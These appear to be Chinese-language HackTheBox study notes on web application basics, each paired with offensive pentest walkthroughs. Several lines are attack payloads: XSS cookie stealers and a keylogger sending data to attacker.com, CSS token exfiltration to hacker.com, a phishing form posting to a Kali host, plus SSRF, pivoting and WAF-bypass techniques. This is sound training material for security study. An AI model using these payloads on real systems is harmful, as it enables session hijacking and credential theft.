==================================================
【HTB 筆記】Web 應用程式入門核心概念
==================================================

1. 網站 (Website) vs Web 應用程式 (Web App)
   - 傳統網站 (Web 1.0)：
     * 靜態頁面、單向展示資訊、內容對所有訪客皆相同。
   - 現代 Web App (Web 2.0)：
     * 動態互動架構 (Client-Server)。
     * 前端展示 (HTML/CSS/JS) + 後端商業邏輯與資料庫互動。
     * 特色：模組化、跨平台相容、免安裝即開即用。

2. 常見 Web 框架與架構類型
   - 開源 CMS：WordPress, OpenCart, Joomla
   - 商業/雲端託管：Wix, Shopify, DotNetNuke

3. 為什麼 Web 應用程式風險極高？
   - 攻擊面極廣：通常必須對公開網際網路開放，任何人皆可存取。
   - 進入內網的跳板：Web 伺服器常連接著內部敏感資料庫或企業 AD 網域。
   - 遵循標準：通常採用 OWASP Top 10 與 OWASP Web 安全測試指南評估。

4. 課程提及的經典漏洞類型：
   - SQL Injection (SQLi)：
     * 輸入未過濾，導致惡意 SQL 指令被執行，可用於撈取機密資料或帳號名稱。
   - 檔案包含 (File Inclusion / LFI / RFI)：
     * 讀取伺服器內部設定檔，甚至誘發遠端程式碼執行 (RCE)。
   - 無限制檔案上傳 (Unrestricted File Upload)：
     * 上傳惡意後門 (如 PHP Web Shell)，直接拿下伺服器執行權限。
   - 不安全直接物件參照 (IDOR)：
     * 存取控制缺陷，透過修改參數 (如 user_id) 竊取或竄改他人資料。
==================================================

==================================================
【實戰解析】滲透測試與打靶什麼時候會用到 Web 漏洞？
==================================================

在真實滲透測試與 HTB / OSCP 靶機中，Web 漏洞通常扮演「初始立足點 (Initial Foothold)」：

1. 突破邊界拿 Shell（打靶最標準的第一步）
   - 實戰情境：
     * Nmap 掃描靶機，通常會看到開著 Port 80 (HTTP) 或 443 (HTTPS)。
     * 很多靶機的作業系統與 SSH 密碼都很嚴格，根本無法直接登入。
   - 攻擊手段：
     * 找到後台登入頁的 SQL Injection 繞過認證，或找到檔案上傳點。
     * 上傳 Web Shell (例如一句話木馬)，取得 Reverse Shell (反彈 Shell)。
     * 成功拿下目標機器上的第一層本地使用者權限 (如 www-data 或 iis apppool)。

2. 從 Web 漏洞串接「內網 AD 攻擊」（兩者串連的關鍵）
   - 實戰情境：
     * 如本篇教材所提：公司內部往往將 Web 系統與 Active Directory 綁定。
   - 攻擊手段：
     * 透過 Web 上的 SQLi，即使查不出密碼，也能把 AD 內所有員工的帳號、
       Email 列表整份撈出來。
     * 滲透員拿到這些真實帳號名單後，去針對公司的 VPN、OWA (Web Mail) 
       或內部入口發動「密碼噴灑 (Password Spraying)」。
     * 一旦猜中一組弱密碼，攻擊者就成功跨過外網防線，長驅直入企業內網。

3. 敏感資訊洩漏與組態失誤
   - 實戰情境：
     * 透過 IDOR 或原始碼審查，找到隱藏的 API 端點或未受保護的備份檔案 (.git、config.php.bak)。
   - 攻擊手段：
     * 很多後端設定檔直接明文寫死了資料庫 root 帳密、AWS Access Key 
       或 AD 網域服務帳號 (Service Account) 的憑據。
     * 攻擊者直接拿這組憑據去橫向移動或提權。

4. 認證考試的核心必考題
   - 在 eJPT、OSCP、CPTS 等認證中：
     * 至少有 50% 以上的靶機都需要透過 Web 應用程式漏洞打下初始存取權。
     * 接著才在靶機內部進行本機提權，或是轉向進攻 AD 網域環境。
==================================================

【觀念架構】Web 滲透測試的三大維度 (攻擊面劃分)
==================================================

1. 前端攻擊 (Client-Side)
   * 戰場：使用者的瀏覽器 (用戶端環境)。
   * 核心目標：竊取使用者憑據、偽造身分、控制瀏覽器行為。
   * 常見漏洞：
     - XSS (跨網站腳本攻擊)：注入惡意 JS，盜取 Session Cookie 或 Keylogger。
     - CSRF (跨網站請求偽造)：借刀殺人，誘騙受害者瀏覽器發送惡意請求。
     - CORS 配置失誤：跨域限制寬鬆，導致敏感資料可被第三方網站讀取。
     - Clickjacking (點擊劫持)：利用透明 iframe 誘騙使用者點擊授權按鈕。

--------------------------------------------------
2. 後端攻擊 (Server-Side)
   * 戰場：伺服器作業系統、業務邏輯程式、資料庫 (核心大本營)。
   * 核心目標：讀取機密資料庫、竄改業務邏輯、拿下伺服器 Shell (控制權)。
   * 常見漏洞：
     - SQL 注入 (SQLi)：操控資料庫，洩漏帳密名單或寫入惡意檔案。
     - 任意檔案上傳 (File Upload)：上傳一句話木馬 (Web Shell) 取得初始立足點。
     - 檔案包含 (LFI / RFI)：讀取 /etc/passwd、win.ini 等系統機密檔。
     - 命令注入 / RCE (遠端程式碼執行)：直接以伺服器權限執行系統指令。
     - IDOR (越權存取)：改參數數字直接存取其他用戶的私密資源。

--------------------------------------------------
3. 中間與架構層攻擊 (Transport & Infrastructure)
   * 戰場：HTTP 協定解析、反向代理 (Nginx/HAProxy)、快取 (Cache)、內部通道。
   * 核心目標：繞過邊界防護 (WAF)、打入受保護的內部網路 (Intranet)。
   * 常見漏洞：
     - SSRF (伺服器端請求偽造)：把 Web 主機當跳板，向內部內網發起請求。
     - HTTP Request Smuggling (請求走私)：利用前後端伺服器對封包邊界的解析差異攻擊。
     - 快取投毒 (Web Cache Poisoning)：讓快取伺服器儲存惡意內容派發給所有人。
     - 中間人攻擊 (MITM) / SSL 剝離：在明文或弱加密傳輸通道中攔截敏感憑證。
==================================================

【實戰思維】打靶與滲透時的攻擊流程決策
==================================================

拿到一個 Web 目標時，滲透員通常按照以下邏輯做判斷：

1. 找「進入點 (RCE / Shell)」 $\rightarrow$ 優先鎖定【後端】
   - 目的：拿到靶機底層系統的命令列控制權 (Initial Foothold)。
   - 做法：
     * 先找「上傳功能」（大頭貼、附件匯入）嘗試傳 Web Shell。
     * 找帶有參數查詢的後台，測 SQLi 撈帳密或直接寫入檔案。
     * 查看使用什麼 CMS (如 WordPress) 與插件，搜尋現成的已知 RCE CVE。

2. 後端防禦太死、沒有直接執行漏洞 $\rightarrow$ 轉向【中間層 (SSRF)】
   - 目的：外網打不進去，利用 Web 幫你打內網。
   - 做法：
     * 找具有「抓取外部網址 / 預覽圖片 / Webhook」的功能。
     * 輸入 `http://127.0.0.1:8080` 或 `http://169.254.169.254` (雲端中繼資料)。
     * 讓伺服器自己去訪問原本不對外開放的內部管理後台或雲端金鑰。

3. 遇到管理員後台、需要偷憑據 $\rightarrow$ 採用【前端 (XSS / CSRF)】
   - 目的：沒有管理員帳密，但看到「聯絡客服 / 留言板 / 檢舉功能」。
   - 做法：
     * 靶機（如 HTB 的 Web 難題）常會模擬一個「Bot 管理員每 1 分鐘會去點開你的留言」。
     * 這時在留言塞 XSS 腳本，管理員打開頁面時，他的管理員 Session Cookie 
       就會自動傳回你的監聽機器，直接拿 Token 登入後台。

==================================================
【HTB 筆記】Web 應用程式佈局與架構基礎 (Layout)
==================================================

1. Web 應用的三大基本組成層次：
   - 基礎設施 (Infrastructure)：底層硬體、OS、網路環境。
   - 元件 (Components)：UI/UX、用戶端腳本 (Client)、伺服器端腳本 (Server)。
   - 架構 (Architecture)：各元件與網路之間的連通與交互關係。

2. 四大常見部署模型 (Deployment Models)：
   (1) Client - Server：最經典的客戶端-伺服器模型。
   (2) One Server (單一主機)：
       - Web 程式與資料庫 (DB) 放在同一台機器。
       - 缺點：單點故障 (SPOF)；遭入侵時全部資料直接淪陷。
   (3) Many Servers - One Database (多伺服器 - 單資料庫)：
       - 多台 Web 主機負責負載均衡，後端共用獨立 DB。
       - 具備基本的安全隔離，Web 被攻破不代表 DB 直接淪陷。
   (4) Many Servers - Many Databases (多伺服器 - 多資料庫)：
       - 高度分散式架構，不同業務模組擁有獨立 DB，安全性與容錯最高。

3. 經典三層架構 (Three-Tier Architecture)：
   - 展示層 (Presentation Layer)：HTML / CSS / JS，與瀏覽器互動。
   - 應用層 (Application Layer)：業務核心邏輯處理、身分驗證、權限判定。
   - 資料層 (Data Layer)：資料庫 (SQL/NoSQL) 與檔案儲存。

4. 現代架構形態：
   - 微服務 (Microservices)：
     * 將龐大系統拆解成獨立小單元 (例如登入、付款、搜尋獨立運行)。
     * 元件間多透過 REST API 或無狀態 (Stateless) 訊息通訊。
   - 無伺服器 / 雲容器 (Serverless / Cloud Native)：
     * 運行於 AWS、GCP、Azure 上的 Docker 容器或 Function。
     * 由雲端平台託管底層伺服器與負載均衡。
==================================================

【實戰解析】滲透與打靶什麼時候會用到「Web 佈局架構」？
==================================================

在實戰與 HTB / OSCP 靶機中，搞清楚架構能直接決定你的下一步攻擊方向：

1. 判斷自己打下的到底是什麼機器？ (環境感知)
   - 實戰情境：
     * 利用 Web Shell 拿到系統命令列權限。
     * 菜鳥會以為自己已經拿到整台核心主機了。
   - 實戰利用：
     * 懂架構的老手會先下指令：`whoami`、`ip a`、`cat /proc/1/cgroup`。
     * 檢查自己是不是被困在 Docker 容器或微服務沙盒內（如果是，下一步是「容器逃逸 Container Escape」）。
     * 檢查本地有沒有跑資料庫（`netstat -tlpn` 查看 3306/1433 是否開在 127.0.0.1）。
       如果沒有，代表資料庫在別台機器，這就是典型的「多主機架構」。

2. 從 Web 伺服器發動「內網橫向移動 (Lateral Movement)」
   - 實戰情境：
     * 遇到「多伺服器 - 單一/多資料庫」架構時。
   - 實戰利用：
     * Web 伺服器一定會有連向後端資料庫的帳號密碼。
     * 滲透員會去翻 Web 的設定檔（如 config.php、appsettings.json、.env）。
     * 找到後端 DB 的內網 IP (如 192.168.10.x) 與帳密，利用該 Web 主機作為跳板 (Pivoting)，
       打進外網連不到的內網資料庫區段。

3. 利用「中間層與架構缺陷」打穿內網 (SSRF 攻擊)
   - 實戰情境：
     * 面對微服務架構 (Microservices) 或雲端無伺服器環境。
   - 實戰利用：
     * 微服務之間通常預設「彼此互相信任」，內部 API 往往完全沒做密碼驗證。
     * 只要在外網 Web 找到一個 SSRF (伺服器端請求偽造) 漏洞，
       就能叫 Web 主機替你去打內部的微服務 API 或雲端 Metadata (169.254.169.254)，
       直接偷出 IAM 雲端管理金鑰。

4. 靶機認證 (OSCP / CPTS) 考題模式
   - 以前的簡單靶機多是「單一伺服器」：打下 Web，本地提權成 root 就通關。
   - 現在主流考試全是「分散式架構」：
     * 第一步：打下外網 Web 容器。
     * 第二步：在容器裡翻設定檔，找到內網資料庫或 AD 域控的 IP 與憑證。
     * 第三步：架設代理隧道 (Chisel / Ligolo-ng) 橫向跳進內網核心。
==================================================

【實戰解析】滲透與打靶何時會遇到微服務隔離資料庫？
==================================================

在進階 HTB 靶機或企業內網滲透時，打下一台機器往往「看不到資料庫」，
需要透過以下手法突破網路隔離：

1. 網路拓撲探測 (Port Scanning via Pivot)
   - 攻擊情境：
     * 打下一台前台 Web 容器，在容器內找不到資料庫，下指令也連不上外網。
   - 滲透手法：
     * 將靜態掃描工具 (如 fscan 或自寫 Bash 腳本) 丟進容器，
       向內部網段 (如 10.x.x.x / 172.16.x.x) 掃描 3306、5432、6379 等資料庫通訊埠。
     * 辨識出哪台機器是後端資料庫伺服器。

2. 憑證翻找與跳板連接 (Pivoting)
   - 攻擊情境：
     * 資料庫設了防火牆，只允許特定 Web 容器連線。
   - 滲透手法：
     * 外部滲透機無法直連該資料庫，但你已經控制了被允許連線的 Web 容器。
     * 翻取環境變數 (printenv) 或設定檔找到 DB 帳密。
     * 在容器內建立代理隧道 (Chisel / SSH Dynamic Forwarding / Ligolo-ng)，
       把自己的流量偽裝成該 Web 容器發出，突破網路存取控制連進資料庫。

3. SSRF 盲打內部未認證資料庫 (Redis / Memcached)
   - 攻擊情境：
     * 資料庫在純內網，完全沒有對外開放。
     * 開發者誤以為「在內網就很安全」，因此內網資料庫 (特別是 Redis) 常沒設密碼。
   - 滲透手法：
     * 利用前台 Web 的 SSRF 漏洞，使用 gopher:// 或 dict:// 協定。
     * 叫 Web 主機向內網未受保護的資料庫下達惡意指令（例如寫入 SSH 公鑰或排程任務反彈 Shell）。

【HTB 筆記】Web 前端與後端架構基礎 (Front End vs. Back End)
==================================================

1. 前端元件 (Front-End Components)
   - 執行位置：使用者瀏覽器端 (Client-side)[cite: 24]。
   - 核心三要素：
     * HTML：結構與文字內容[cite: 24]。
     * CSS：外觀樣式、排版與配色[cite: 24]。
     * JavaScript：客戶端動態功能、事件處理與頁面互動[cite: 24]。
   - 核心安全鐵律：
     * 前端所有程式碼對訪客皆為完全透明、可任意竄改。
     * 絕對不能將安全驗證邏輯或機密金鑰僅實作於前端。

2. 後端架構四部曲 (Back-End Server Stack)
   - 伺服器與作業系統 (Back-end Servers)：Linux / Windows / Docker 容器環境[cite: 25, 26]。
   - 網頁伺服器 (Web Servers)：處理 HTTP/HTTPS 請求 (Apache, Nginx, IIS)[cite: 25, 26]。
   - 資料庫 (Databases)：儲存持久化資料 (MySQL, MSSQL, PostgreSQL, MongoDB)[cite: 25, 26]。
   - 開發框架與語言 (Frameworks)：業務核心邏輯 (PHP, ASP.NET Core, Spring, Django, Express)[cite: 25, 26]。

3. 測試型態分類：
   - 白盒測試 (White-Box Testing)：
     * 可存取原始碼與內部架構，能直接審查程式碼以發現深層邏輯缺陷[cite: 27]。
   - 黑盒測試 (Black-Box Testing)：
     * 無法取得後端原始碼，僅能透過外部輸入輸出進行盲測與探測[cite: 27]。

4. 常見開發失誤與安全影響：
   - 信任用戶端輸入、密碼未妥善加密、權限校驗缺失等[cite: 28, 29]。
   - 這些弱點直接映射為 OWASP Top 10 核心風險：
     * 存取控制失效 (Broken Access Control)[cite: 30]
     * 加密機制失效 (Cryptographic Failures)[cite: 30]
     * 注入攻擊 (Injection - SQLi / Command Injection)[cite: 30]
     * 安全配置錯誤 (Security Misconfiguration)[cite: 30]
     * 伺服器端請求偽造 (SSRF)[cite: 30]

【實戰解析】滲透與打靶何時會用到「前後端劃分觀念」？
==================================================

在實戰與 HTB / OSCP 靶機中，理解前後端運作是判斷「漏洞在哪一層」的核心：

1. 前端繞過 (Client-Side Bypasses)
   - 靶機常見場景：
     * 表單驗證限制：網頁要求輸入特定格式的 Email，或限制上傳檔案只能選 .jpg。
     * 輸入框被設為 `disabled` 或 `readonly`，或者金額被 JavaScript 強制鎖死。
   - 實戰應對：
     * 滲透員絕不在瀏覽器表面死磕。
     * 直接使用 Burp Suite 攔截 HTTP 封包，繞過所有瀏覽器 JS 限制，
       在 Request Body 直接將檔案名改成 .php，或將金額改為 0 / 負數後送出。

2. 辨識後端技術棧 (Technology Stack Fingerprinting)
   - 靶機破題關鍵：
     * 面對後端黑盒時，必須先查明「後端跑什麼語言與伺服器」才能選用對應的攻擊向量[cite: 25, 26, 27]。
   - 實戰做法：
     * 檢查 HTTP Response 標頭 (Server: Apache/2.4.41, X-Powered-By: PHP/7.4)。
     * 觀察副檔名 (.php, .aspx, .do) 或 URL 路由風格。
     * 若為 PHP $\rightarrow$ 關注檔案包含 (LFI)、反序列化、弱型別比較。
     * 若為 ASP.NET $\rightarrow$ 關注 ViewState 反序列化、IIS 短檔名漏洞。
     * 若為 Java/Spring $\rightarrow$ 關注 Log4j、Spring Cloud SpEL 表達式注入。

3. 從白盒程式碼審查 (Source Code Review) 挖出後門
   - 靶機常見場景：
     * 許多中高難度靶機會在 Web 目錄留下備份檔 (如 source.zip、.git 目錄洩漏)，
       或允許透過 LFI (本地檔案包含) 讀取後端程式碼[cite: 27, 28]。
   - 實戰應對：
     * 既然拿到原始碼，測試型態立刻由黑盒轉為白盒[cite: 27]。
     * 搜尋敏感關鍵字 (如 password, eval, exec, system, query, DB_PASS)。
     * 直接追蹤資料流向，找出哪個參數未經過濾就拼接進了 SQL 或系統命令列中[cite: 27, 28]。
==================================================

==================================================
【HTB 筆記】HTML 樹狀結構、DOM 與 URL 編碼
==================================================

1. HTML 核心結構 (Tree Structure)：
   - 頂層元素：<html>...</html>[cite: 35, 36]
   - 標頭區 (<head>)：包含頁面標題 (<title>)、樣式 (<style>)、後端設定[cite: 35, 38]。
   - 本文區 (<body>)：包含前端可視元素，如 <h1> (大標題)、<p> (段落)、<img> (圖片)[cite: 34, 35, 38]。

2. DOM (文件物件模型 Document Object Model)：
   - 定義：W3C 標準架構，將 HTML 文件以樹狀結構載入瀏覽器記憶體[cite: 38]。
   - 特色：允許 JavaScript 動態存取、修改網頁內容、屬性與樣式 (例如 document.body)[cite: 38]。
   - 常見屬性：id, class (用於樣式與腳本定位特定節點)[cite: 36]。

3. URL 編碼 (Percent-Encoding 百分比編碼)：
   - 原理：URL 僅允許部分 ASCII 字元，特殊或非 ASCII 字元需轉為 `%` + 16進位代碼[cite: 37]。
   - 常見關鍵字元編碼對照表：
     * 空格 (Space)    -> %20 或 +[cite: 37]
     * 單引號 (')      -> %27[cite: 37]
     * 雙引號 (")      -> %22[cite: 37]
     * 井字號 (#)      -> %23[cite: 37]
     * 錢字號 ($)      -> %24[cite: 37]
     * 百分比 (%)      -> %25[cite: 37]
     * 和字號 (&)      -> %26[cite: 37]
     * 括號 ( ( / ) )  -> %28 / %29[cite: 37]
     * 斜線 (/)        -> %2f
     * 小於/大於 (< >) -> %3c / %3e
==================================================

==================================================
【實戰解析】滲透測試與打靶何時會用到 HTML、DOM 與 URL 編碼？
==================================================

1. XSS 漏洞構造與 DOM 破壞 (DOM-based XSS)
   - 靶機常見情境：
     * 網頁上有一個搜尋框，輸入內容會被 JavaScript 動態寫入 DOM 節點[cite: 38]：
       `document.getElementById("output").innerHTML = location.search;`
   - 實戰手法：
     * 攻擊者閉合原本的標籤，注入自製的惡意標籤破壞 DOM 樹[cite: 38]：
       `"><script>fetch('http://attacker.com/?cookie='+document.cookie)</script>`
     * 瀏覽器解析 DOM 時觸發執行惡意 JS，偷走使用者的登入 Token[cite: 38]。

2. 避開 WAF 防火牆檢測 (URL 編碼與雙重編碼繞過)
   - 靶機常見情境：
     * 後端有 WAF (Web 應用防火牆)，一旦偵測到 URL 包含 `SELECT * FROM`、
       `' OR 1=1` 或 `<script>` 就直接攔截。
   - 實戰手法：
     * 將注入字元做 URL 編碼：
       例如把空格換成 `%20`，單引號換成 `%27`[cite: 37]。
     * 雙重編碼繞過 (Double URL Encoding)：
       有些後端架構（反向代理 + 後端伺服器）會解碼兩次。
       把 `%` 再編碼成 `%25`：
       單引號 `'` -> `%27` -> `%2527`
       WAF 檢查 `%2527` 沒問題放行，後端伺服器解碼兩次還原成單引號，成功觸發 SQLi。

3. 尋找前端隱藏資訊 (審查 DOM 元素)
   - 靶機基本功：
     * 按 F12 打開開發者工具 (Elements 頁籤)，檢視即時 DOM 樹[cite: 38]。
     * 常見隱藏彩蛋：
       - 開發者留下的 HTML 註解：`<!-- admin:adminPass2026 -->`
       - 隱藏輸入欄位：`<input type="hidden" name="is_admin" value="false">`
       - 透過修改 DOM 將 `value="false"` 改為 `true`，直接提交完成越權提權。

【HTB 筆記】CSS (層疊樣式表 Cascading Style Sheets)
==================================================

1. CSS 的本質與定位：
   - 定義：用於控制 HTML 元素的外觀、版面配置與樣式的樣式表語言[cite: 39]。
   - 語法結構：
     selector { property: value; }
     * 選擇器 (Selector)：標記套用樣式的 HTML 標籤、.class 或 #id[cite: 39]。
     * 屬性與值 (Property & Value)：定義顏色、邊距、字型等[cite: 39]。

2. 常見屬性範疇：
   - 顏色與排版：color, background-color, text-align, font-size[cite: 39]。
   - 盒模型 (Box Model)：margin (外距), padding (內距), border (邊框)[cite: 39, 40]。
   - 動畫與視覺特效：@keyframes, animation, transitions[cite: 40]。

3. 常見 CSS 框架 (Frameworks - 機翻修正)：
   - Bootstrap (最廣泛使用的 UI 元件庫)[cite: 41]
   - SASS (CSS 預處理器，增強變數與巢狀語法)[cite: 41]
   - Foundation (原機翻「基礎」)[cite: 41]

   - Tailwind CSS (原機翻「特的」，現代 Utility-First 框架)[cite: 41]

==================================================
【實戰解析】滲透測試與打靶何時會用到 CSS？
==================================================

很多新手認為 CSS 沒有邏輯就沒有危害，但在資安實戰中，CSS 具備奇效：

1. 點擊劫持 (Clickjacking) / UI 紅色盲欺騙
   - 靶機常見場景：
     * 目標網站沒有設定 X-Frame-Options 或 CSP 的 frame-ancestors。
   - 攻擊手法：
     * 攻擊者架設一個好玩的抽獎網頁，用 CSS 樣式：
       `opacity: 0.0001; position: absolute; z-index: 999;`
     * 把受害者已登入的銀行轉帳頁面（或臉書刪除帳號頁面）以透明方式
       精確疊在抽獎按鈕正上方。
     * 使用者以為在點「領取獎金」，實際點到的是透明網頁的「確認轉帳」。

2. CSS 注入盲打偷密碼 (CSS Data Exfiltration)
   - 實戰情境 (極高階 Web 技巧)：
     * 目標網站防禦極嚴，開啟了強大的 CSP (內容安全策略)，完全封鎖了
       JavaScript 的執行 (沒有 XSS 的機會)。
     * 但網站允許使用者自訂部分樣式 (例如論壇自訂主題、或富文本輸入)。
   - 攻擊手法：
     * 利用 CSS 的「屬性選擇器 (Attribute Selector)」配合外部背景圖片加載：
       input[name="csrf_token"][value^="a"] { background-image: url("http://hacker.com/log?a"); }
       input[name="csrf_token"][value^="b"] { background-image: url("http://hacker.com/log?b"); }
     * 當管理員開啟頁面時，若輸入框字元開頭是 "a"，瀏覽器就會自動
       向駭客伺服器發送載入圖片請求。
     * 攻擊者一個字元一個字元逐字外洩 CSRF Token 或使用者密碼，完全不需要 JS！

3. 前端隱藏元素覆蓋與越權
   - 靶機基本功：
     * 開發者用 CSS 隱藏了管理員按鈕：`#admin-panel { display: none; }`
     * 滲透員直接在 F12 開發者工具裡把該行樣式勾掉，按鈕立刻現形。
     * 若後端沒做權限校驗，點擊該按鈕即可直接執行管理功能。

【HTB 筆記】JavaScript (JS) 核心概念與用法
==================================================

1. JavaScript 的定位：
   - 網頁前端唯一的動態執行環境語言 (Client-side Scripting)[cite: 44]。
   - 後端也可以用 (例如 Node.js 執行環境)[cite: 44]。
   - 特色：高階語言、事件驅動 (Event-driven)、具備完整邏輯與非同步通訊 (Ajax)[cite: 45]。

2. 網頁引入方式：
   - 內部嵌入 (Inline)：
     <script type="text/javascript">
       ...JavaScript code...
     </script>[cite: 44]
   - 外部載入 (External Source)：
     <script src="./script.js"></script>[cite: 44]

3. 核心功能 (DOM 操作與資料傳輸)：
   - 動態修改 HTML 元素內容：
     document.getElementById("button1").innerHTML = "Changed Text!";[cite: 44]
   - 非同步資料交換 (Ajax / Fetch API)：
     在無需刷新整個頁面的情況下，向後端伺服器拉取或發送資料[cite: 45]。

4. 常見前端框架 (Frameworks - 機翻校正)：
   - Angular (機翻「角」)[cite: 46]
   - React[cite: 46]
   - Vue.js (機翻「視景台」)[cite: 46]
   - jQuery[cite: 46]

==================================================
【實戰解析】滲透測試與打靶何時會用到 JavaScript？
==================================================

在資安實戰中，99% 的「用戶端攻擊 (Client-Side Attacks)」全部依賴 JavaScript：

1. XSS 漏洞的靈魂 (Cross-Site Scripting)
   - 靶機常見情境：
     * 留言板、使用者名稱、搜尋框沒有過濾 `<script>` 標籤。
   - 攻擊手法：
     * 塞入惡意 JS 代碼：
       <script>
         var img = new Image();
         img.src = 'http://attacker.com/steal?cookie=' + document.cookie;
       </script>
     * 當管理員打開後台看留言時，他的瀏覽器自動執行這段 JS，
       將身分證明的 Session Cookie 自動打包寄給攻擊者，直接免密碼登入管理員帳號。

2. 鍵盤側錄與釣魚彈窗 (Keylogger & Phishing)
   - 實戰情境：
     * 藉由 XSS 在登入頁面植入幾行 JS 程式碼：
       document.onkeypress = function(e) {
         fetch('http://attacker.com/log?key=' + e.key);
       };
     * 使用者打帳號、密碼時，每敲一個字母，JS 就即時偷偷回傳給攻擊者。
     * 偽造彈窗：呼叫 `prompt("您的連線已過期，請重新輸入密碼")` 騙取使用者憑據。

3. 前端原始碼審查 (Source Code Review / JS 逆向)
   - 靶機常見套路 (極高頻率考點)：
     * 按 F12 打開開發者工具的「Sources」頁籤，翻看網站載入的 `.js` 檔案。
     * 常見致命失誤：
       - 工程師把未公開的內部 API 路徑寫死在 JS 裡 (如 /api/v1/internal_debug)。
       - 工程師把第三方金鑰寫死 (如 AWS S3 Key、Stripe API Token、Google Maps Key)。
       - 甚至把「管理員驗證邏輯」寫在前端 (例如 if (input == "admin123") { window.location="/admin"; })。

4. 前端檢驗繞過 (Bypass Client-side Validation)
   - 實戰應對：
     * 很多表單會用 JS 限制「電話號碼只能打數字」或「禁止輸入單引號 '」。
     * 滲透員只要在 Console 終端直接改寫該驗證函式，或者直接用 Burp Suite
       攔截封包，讓瀏覽器的 JS 限制形同虛設。

==================================================
【HTB 筆記】敏感資料外洩 (Sensitive Data Exposure)
==================================================

1. 核心弱點成因：
   - 前端代碼 (HTML/JS/CSS) 對所有訪客具備 100% 透明性[cite: 24]。
   - 開發人員在部署生產環境 (Production) 前，未將開發時期的除錯註解、
     測試憑據與隱私資訊徹底清理。

2. 常見外洩內容類型：
   - 開發者註解 (HTML Comments)：
     語法為 `<!-- 註解內容 -->`，雖不渲染在畫面上，但在原始碼中完全可見。
   - 硬編碼憑證 (Hardcoded Credentials)：
     測試用的帳號密碼 (如 admin / test 等預設帳號)。
   - 隱蔽目錄與路由 (Hidden Endpoints)：
     未公開的管理後台路徑、測試用 API 端點、未完成的功能入口。
   - 敏感配置資訊：
     後端伺服器版本、資料庫主機名稱、開發人員個人資訊。

3. 開發端防禦原則 (Remediation)：
   - 上線前執行代碼清洗：移除所有 HTML 與腳本中的多餘註解。
   - 前端程式碼混淆與壓縮 (Minification/Obfuscation)：
     去除空白與註解，增加反向分析難度。
   - 零信任原則：絕不將任何密碼、私密金鑰存放在客戶端程式碼中。
==================================================

==================================================
【實戰解析】打靶第一步：原始碼審查 (Source Inspection)
==================================================

在 HTB、OSCP 與真實紅隊演練中，拿到 Web 靶機 IP 後的「標準前置動作」：

1. 手動快速查勘 (Reconnaissance)
   - 快捷鍵操作：
     * `Ctrl + U` (直接開新分頁檢視 HTML 原始碼)。
     * `F12` -> 切換到「Elements」查看動態渲染的 DOM。
     * `F12` -> 切換到「Sources」或「Debugger」展開所有載入的 .js 檔案。
   - 關鍵字搜尋 (Ctrl + F)：
     * `TODO` 或 `FIXME` (工程師最愛留的未完成標記)
     * `password`、`user`、`admin`、`cred`、`secret`、`key`、`api`
     * `<!--` (快速跳轉看所有 HTML 註解)

2. 自動化爬蟲提取敏感資訊 (CLI 工具)
   - 當網站頁面很多、JS 檔案成千上萬行時，不可能用肉眼逐一看：
   - 實戰工具組合：
     * curl 抓取與正規表達式過濾：
       `curl -s http://<目標IP>/ | grep -E "<!--|TODO|admin"`
     * 用 `katana` 或 `gau` 抓出網站全部 URL 與 JS 檔案路徑。
     * 用 `SecretFinder` 或 `TruffleHog` 自動掃描 JS 裡洩漏的 AWS Key、
       Google API Token 或資料庫連線字串。

3. 靶機過關實例：
   - 靶機登入介面看似無懈可擊，點開原始碼直接看到：
     `<!-- <input type="hidden" name="debug_pass" value="HTB{c0mm3nts_4r3_n0t_s3cr3t}"> -->`
   - 複製貼上直接通關，完全不用任何提權或注入技術。

==================================================
【HTB 筆記】HTML 注入 (HTML Injection) 核心觀念
==================================================

1. 漏洞成因：
   - 應用程式接收了使用者輸入的資料，未經過濾 (Sanitization) 或
     編碼轉義 (Encoding)，直接使用如 innerHTML 等方法將內容渲染至 DOM 中[cite: 28, 29]。

2. 攻擊維度與危害：
   - 視覺劫持 / 網頁篡改 (Defacement)：
     注入自訂 HTML / CSS 改寫頁面外觀與展示惡意圖文[cite: 28]。
   - 惡意釣魚 (In-page Phishing)：
     在正常網頁中注入偽造的登入表單 (<input>、<form>)，
     誘導使用者輸入憑據並發送至攻擊者伺服器[cite: 28]。
   - 漏洞升級 (Gateway to XSS)：
     若系統允許任意標籤且未防範 JavaScript 執行，HTML 注入可直接演變為 XSS[cite: 28, 29]。

3. 開發端防禦原則：
   - 輸出編碼 (Output Encoding)：
     把 `<` 轉成 `&lt;`，把 `>` 轉成 `&gt;`，讓瀏覽器只當成純文字印出，不當作標籤解析。
   - 安全的 DOM 賦值：
     在 JavaScript 中優先使用 `innerText` 或 `textContent`，取代危險的 `innerHTML`[cite: 29]。
==================================================

==================================================
【實戰解析】滲透測試與打靶如何測試 HTML 注入？
==================================================

1. 探測漏洞是否存在 (Probing)
   - 靶機常見情境：
     * 任何能輸入文字並會在頁面上印出來的地方 (搜尋欄、留言板、個人 Profile、錯誤回顯頁面)[cite: 28]。
   - 測試 Payload (依序測試)：
     * 第一步 (測文字效果)：`<h1>TEST</h1>` 或 `<u>underlined</u>`
       如果頁面上的字變大或出現底線，代表存在 HTML 注入[cite: 28]。
     * 第二步 (測標籤解析)：`<img src=x onerror=alert(1)>`
       如果跳出警報視窗，代表防禦更爛，直接拿到了 XSS[cite: 29]。

2. 製作釣魚表單竊取憑據 (實戰經典利用)
   - 實戰手法：
     * 當目標頁面有 HTML 注入但擋掉了 `<script>` (無法直接執行 JS XSS)：
     * 攻擊者直接注入 HTML 表單結構：
       ```html
       <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">
         <h3>連線逾時，請重新登入管理員帳號</h3>
         <form action="http://<Kali_IP>:8000/steal" method="POST">
           <input type="text" name="user" placeholder="帳號"><br>
           <input type="password" name="pass" placeholder="密碼"><br>
           <button type="submit">登入</button>
         </form>
       </div>
       ```
     * 在 Kali 終端機啟動監聽：`python3 -m http.server 8000` 或利用 Netcat 接收密碼[cite: 28]。

3. 繞過前端過濾 (Bypass)
   - 靶機常見防護：前端 JS 限制輸入長度或禁止輸入 `<`。
   - 應對手段：
     * 點擊提交前用 Burp Suite 攔截 HTTP 封包，直接在 POST Request Body 裡塞入完整 Payload[cite: 24]。

==================================================
【觀念拆解】HTML 超連結注入 (<a> Tag Injection) 原理
==================================================

1. 為什麼連結真的可以點？
   - DOM 解析機制：
     瀏覽器的渲染引擎在接收到 innerHTML 時，會將字串當作標準 HTML 語法重新解析。
     因此 `<a href="...">` 會被直接實體化為 DOM 樹中的 HTMLAnchorElement 節點[cite: 20]。

2. 單純超連結會不會「直接噴出密碼」？
